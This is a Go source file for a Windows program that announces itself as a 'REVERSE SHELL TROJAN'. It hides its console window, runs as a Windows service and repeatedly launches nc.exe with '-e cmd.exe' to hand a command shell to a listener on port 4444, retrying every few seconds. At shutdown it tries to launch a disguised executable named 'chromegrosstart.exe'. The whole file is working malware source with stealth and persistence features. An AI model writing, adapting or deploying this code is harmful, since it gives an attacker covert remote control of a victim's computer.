package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/debug"
)

var (
	kernel32DLL      = windows.NewLazySystemDLL("kernel32.dll")
	user32DLL        = windows.NewLazySystemDLL("user32.dll")
	getConsoleWindow = kernel32DLL.NewProc("GetConsoleWindow")
	showWindow       = user32DLL.NewProc("ShowWindow")
)

const (
	SW_HIDE          = 0 // Hide the window
	SW_SHOW          = 5 // Show the window
	GWL_EXSTYLE      = -20
	WS_EX_APPWINDOW  = 0x00040000
	WS_EX_TOOLWINDOW = 0x00000080
)

const IP = "127.0.0.1"

type myService struct{}

func (m *myService) Execute(args []string, r <-chan svc.ChangeRequest, status chan<- svc.Status) (bool, uint32) {

	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
	tick := time.Tick(5 * time.Second)

	status <- svc.Status{State: svc.StartPending}

	status <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

loop:
	for {
		select {
		case <-tick:
			log.Print("Tick Handled...!")
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				status <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				log.Print("Shutting service...!")
				break loop
			case svc.Pause:
				status <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
			case svc.Continue:
				status <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
			default:
				log.Printf("Unexpected service control request #%d", c)
			}
		}
	}

	status <- svc.Status{State: svc.StopPending}
	return false, 1
}

func runService(name string, isDebug bool) {
	if isDebug {
		err := debug.Run(name, &myService{})
		if err != nil {
			log.Fatalln("Error running service in debug mode.")
		}
	} else {
		go attempt()
		err := svc.Run(name, &myService{})
		if err != nil {
			log.Println("Error running service in Service Control mode.")
			attempt()
		}
	}
}

func getDirpath() string {
	exePath, err := os.Executable()
	if err != nil {
		log.Printf("Error getting executable path: %v\n", err)
		return "Error"
	}

	// Get the directory of the executable
	exeDir := filepath.Dir(exePath)

	log.Printf("Executable Path: %s\n", exePath)
	log.Printf("Executable Directory: %s\n", exeDir)
	return exeDir
}
func getExepath() string {
	exePath, err := os.Executable()
	if err != nil {
		log.Printf("Error getting executable path: %v\n", err)
		return "Error"
	}
	return exePath
}

func attempt() {
	cmd := exec.Command(getDirpath()+"\\nc.exe", IP, "4444", "-e", "cmd.exe")

	output, err := cmd.Output()
	if err != nil {
		log.Println("Output:", output)
		log.Println("Error:", err)
		log.Println("Retrying....")
		time.Sleep(5 * time.Second)
		attempt()
	}

	log.Println(string(output))
	log.Println("Server disconnected")
	log.Println("Retrying....")
	time.Sleep(5 * time.Second)
	attempt()
}

func main() {
	hwnd, _, _ := getConsoleWindow.Call()

	if hwnd == 0 {
		fmt.Println("No console window found.")
		return
	}

	_, _, err := showWindow.Call(hwnd, SW_HIDE)
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Printf("Failed to hide console window: %v\n", err)
		return
	}
	fmt.Println("REVERSE SHELL TROJAN BY")
	fmt.Println("    --- DruUgd ---     ")
	fmt.Println("          OR           ")
	fmt.Println("      DrugDaemon       ")

	runService("grg", false)

	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	<-sigs

	log.Println("Shutting down...")

	cmd := exec.Command("start", getExepath()+"\\chromegrosstart.exe")
	output, err := cmd.Output()
	if err != nil {
		log.Println("Output:", output)
		log.Println("Error:", err)
	}
}
